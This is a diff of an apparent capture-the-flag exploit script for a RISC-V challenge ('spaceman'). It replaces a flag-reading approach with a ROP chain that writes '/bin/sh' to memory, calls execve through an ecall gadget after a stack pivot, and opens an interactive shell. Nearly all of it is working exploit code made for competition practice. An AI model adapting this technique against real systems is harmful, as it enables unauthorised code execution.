@@ -71,45 +71,44 @@ def open_at(io, p_addr, addr):
 def exploit(io,e):
     sleep(5)
     # 0x8a488 => 0x8a2b8 => 0x8a518 => writeable mem
-    chain = b"A" * 8 + p64(0xdeadbeef)
+    flag_fd = 5
+    p_addr = 0x8a2b8
+    pp_addr = 0x8a488
+    writable_addr = 0x8a510
+    gadget = 0x2c3be
+
+
+
+    ecall_num = p64(0xdd) # execve 221
+    third_arg = p64(0) 
+    ecall = p64(0x1d8ac) # ecall; ret gadget 
+    first_arg = p64(writable_addr+0x10) # ptr to "/bin/sh"
+    second_arg = p64(0)
+
+    chain = b"A" * 8 
+    chain += ecall_num + third_arg
+    chain += ecall + first_arg
+    chain += second_arg
+
     sla(io, b"LOGIN: ", chain)
 
-    #write_three_bytes(io, 0x89070, 0x8b1c8, b"AAA")
-    #write_three_bytes(io, 0x8a2b8, 0x8a518, b"AAA")
-    #write_three_bytes(io, 0x8a488, 0x8a2b8, b"\x1b\xa5\x08")
-    #write_three_bytes(io, 0x8a2b8, 0x8a51b, b"AAA")
-    # write flag.txt
-    write_data(io, 0x8a488, 0x8a2b8, 0x8a51b, b"/home/papichulo/Desktop/ExploitDev/LiveCTF/BuckeyeCTF/spaceman-chal/flag.txt\x00\x00")
+    binsh = b"/bin/sh\x00\x00"
+
+    # write /bin/sh
+    write_data(io, pp_addr, p_addr, writable_addr+0xb, binsh)
     
-    # set ptr back to beginning of flag.txt
-    write_three_bytes(io, 0x8a488, 0x8a2b8, p32(0x8a520))
-    open_at(io, 0x8a2b8, 0x8a520) # fd is at 5
+    # set ptr back to beginning of writeable data
+    write_three_bytes(io, pp_addr, p_addr, p32(writable_addr+0x10))
  
     # write ROP
-    write_three_bytes(io, 0x8a488, 0x8a2b8, p32(0x8a510))
-    write_data(io, 0x8a488, 0x8a2b8, 0x8a510 - 5, b"BBBBBBBB")
-    write_three_bytes(io, 0x8a488, 0x8a2b8, p32(0x8a510))
+    write_three_bytes(io, pp_addr, p_addr, p32(writable_addr))
+    write_data(io, pp_addr, p_addr, writable_addr - 5, p64(0x5))
+    write_three_bytes(io, pp_addr, p_addr, p32(writable_addr))
     
-    # stack pivot
-    payload = b"A"*0x10 + p64(0x8a2b8)
-    #payload += p64(0x4251e) # c.mv ra, a1 ; ... ; jr ra
-    #payload += p64(0x3e5ea) # c.mv ra, gp
-    #payload += p64(0x2fbb0) # c.ldsp ra, sp(0) <= this is the username buffer
-    
-
-    # 0x000000000002475a : addi a7, zero, 0x3f ; ecall
-    
-    # 0x000000000004cdfc : c.add a7, s0 ; c.jr ra
-
-    # 0x0000000000011d8e : c.ldsp a7, 0x10(sp) ; c.mv s0, a0 ; beq a0, a5, -0x5d8
-
-
-    payload += p64(0x1084a)
+    payload = b"A"*0x10 + p64(p_addr)
+    payload += p64(gadget)
     sla(io, b"COMMAND>", payload)
-    sla(io, b"COMMAND>", p64(0x8a510))
-
-    #sleep(5)
-    #sl(io,b"fla")
+    sla(io, b"COMMAND>", p64(writable_addr))    
 
     io.interactive()
     
